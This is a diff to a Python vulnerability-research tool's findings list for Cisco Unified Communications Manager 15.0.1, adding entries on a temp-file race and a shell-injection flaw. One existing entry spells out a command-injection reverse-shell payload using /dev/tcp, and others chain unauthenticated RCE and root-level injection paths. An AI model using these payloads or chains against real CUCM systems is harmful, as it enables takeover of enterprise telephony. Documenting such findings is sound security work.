@@ -856,7 +856,7 @@ CUCM-F95 MEDIUM: pms.war Jersey JAX-RS FindPhoneByDN + PhoneMigration -- no auth
   Chain: F84 (TFTP phone config enumeration -> MACs) -> F95 (FindPhoneByDN -> MAC-to-extension mapping)
 """
 
-VERSION = "3.22.0"
+VERSION = "3.23.0"
 
 import requests
 import urllib3
@@ -1884,6 +1884,8 @@ def full_findings_summary() -> str:
         ("CUCM-F93", "HIGH",    "cm-soap2-logcollectionservice2 logcollectionservice2.war Axis2 1.4 (axis2-kernel-1.4.jar): hardcoded default admin:axis2 in WEB-INF/conf/axis2.xml (same as F1 for axl.war but separate WAR); AdminService.aar deployed with default creds -> unauthenticated arbitrary .aar deployment = RCE; no WS-Security module loaded (only addressing + soapmonitor); Axis2 1.4 CVE-2010-2103 admin bypass + SSRF; GetOneFile service: whitelist bypass potential if selectLogFiles called to manipulate fileMap with short entries (substring contains() check on canonical path)"),
         ("CUCM-F94", "CRITICAL","cm-bps BAT DRF bat_do_backup.py / bat_do_restore.py: third independent DRF os.system() + sudo tar injection class (F63/F67/F94 = systemic DRF framework defect); DEVICE_TARBALL/LOGPATH/ENC_SEQ (backup) and DEVICE/DEC_SEQ/LOGPATH (restore) all from sys.argv directly concatenated into os.system shell commands; restore: command = DEVICE + DEC_SEQ + ' | sudo /bin/tar ...' -- DEVICE is first token = command-prefix injection (';bash -i &>/dev/tcp/x/443 <&1 # '); all three injection points reach root via sudo; chain: F63 (cm-syslog DRF), F67 (cm-reporter DRF) -- same class"),
         ("CUCM-F95", "MEDIUM",  "pms.war (Property Management System integration) Jersey JAX-RS REST API FindPhoneByDN + PhoneMigration (@GET) no <auth-constraint> in <security-constraint>; only <transport-guarantee>NONE</transport-guarantee> present; container-level auth not enforced; FindPhoneByDN: phone MAC-to-DN mapping enumerable without auth; PhoneMigration: exposes migration/upgrade state; chain: F84 (TFTP phone config enumeration -> phone MACs) -> F95 (FindPhoneByDN -> MAC-to-extension map)"),
+        ("CUCM-F96", "MEDIUM",  "cm-CtlCli ctl_cli.sh copy_ctlFile() TOCTOU: /tmp/ctl_batch and /tmp/delete_ctl_batch created via cat >> (no O_EXCL) at predictable world-writable paths; race window between cat-create and sftp_connect.sh -b /tmp/ctl_batch sftpuser@$node execution; attacker with local shell pre-plants malicious SFTP batch commands -> sftpuser executes injected SFTP commands on ALL cluster peer nodes during any CTL file operation (mode change, certificate rotation, CTL reset); sftpuser has cluster-wide SFTP access by design; class: CWE-377 (same as F72 cm_idp_post.sh /tmp/list_cmd); chain: F72 (TOCTOU class), F35 (CTL file controls cluster security mode)"),
+        ("CUCM-F97", "HIGH",    "cm-RIS mmfSpyScript.sh: OUTPUT=`/usr/local/cm/bin/mmfSpy ${PARAMS[*]}` -- ${PARAMS[*]} unquoted array expansion in backtick command; word-split on whitespace causes shell metacharacters in CLI args (backtick, $(), ;, |, &) to break out of argument context and execute as shell commands in mmfSpyScript.sh process context; attack vector: authenticated CLI user runs 'show risdb <injected>' with metachar payload; privilege level = dispatch context of mmfSpyScript.sh (platform CLI broker typically root or privileged service account); class: CWE-78 (same as F63/F67/F94 DRF injection family, different component); remediation: quote array as \"${PARAMS[@]}\" and validate against allowlist"),
     ]
     lines = [f"CUCM 15.0.1 RE Findings [{VERSION}] — 2026-08-27", ""]
     for fid, sev, title in findings:
